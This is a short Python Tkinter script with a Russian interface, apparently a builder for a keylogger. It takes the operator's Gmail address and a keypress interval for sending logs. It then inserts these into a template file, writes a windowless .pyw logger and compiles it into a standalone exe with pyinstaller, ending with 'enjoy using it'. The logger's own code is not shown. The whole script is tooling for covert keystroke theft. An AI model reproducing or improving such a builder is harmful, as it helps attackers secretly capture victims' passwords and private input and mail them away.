from tkinter import *
import os
import subprocess
import codecs
from tkinter import messagebox
root = Tk()
root.title('Builder')
root.resizable(False, False)
root.geometry('600x400+200+100')
root['bg'] = '#0c0fe8'

def builder(email, kol_vo):
    path1 = 'doc.txt'
    path2 = 'enter_logger.pyw'
    kol_vo = int(kol_vo)
    t = 'TO = "'+ email + '"\nkol_vo = '+ str(kol_vo) + '\n'
    c = codecs.open(path1, 'r', 'utf-8')
    f = c.readlines()
    for l in f:
        t = t + l
    c.close()
    c = codecs.open(path2, 'w', 'utf-8')
    c.write(t)
    messagebox.showinfo(title='Information', message = 'Создан python файл, идет компиляция файла в exe...')
    subprocess.getoutput('pyinstaller --onefile enter_logger.pyw')
    messagebox.showinfo(title='Information', message = 'Exe файл создан, приятного использования!')





def fun():
    global builder
    mail = e1.get()
    if mail == '' or '@gmail.com' not in mail:
        messagebox.showerror(title = 'Builder Error', message='Введите свою почту!')
        return
    kol_vo = e2.get()
    if kol_vo == '':
        messagebox.showerror(title = 'Builder Error', message='Введите число во 2ую ячейку!')
        return
        
    try:
        kol_vo = int(kol_vo)
    except:
        messagebox.showerror(title = 'Builder Error', message='Введите число во 2ую ячейку!')
        return
    
    builder(mail, kol_vo)
    
l1 = Label(text = 'Введите свою gmail почту', font=("Arial 32", 24), bg = '#0c0fe8', fg = '#ffffff')
l2 = Label(text = '\nРаз в сколько нажатий будут приходить логи?', font=("Arial 32", 17), bg = '#0c0fe8', fg = '#ffffff')
e1 = Entry(width = 30, justify = 'center', font = ('Verdana', 15))
e2 = Entry(width = 20, justify = 'center', font = ('Verdana', 15))
b1 = Button(text = 'Запустить создание файл', height = 20, width = 50, bg = '#11ff00', font=("Verdana", 15), command = fun)



l1.pack()
e1.pack()
l2.pack()
e2.pack()
b1.pack(padx = 5, pady = 50)
root.mainloop()

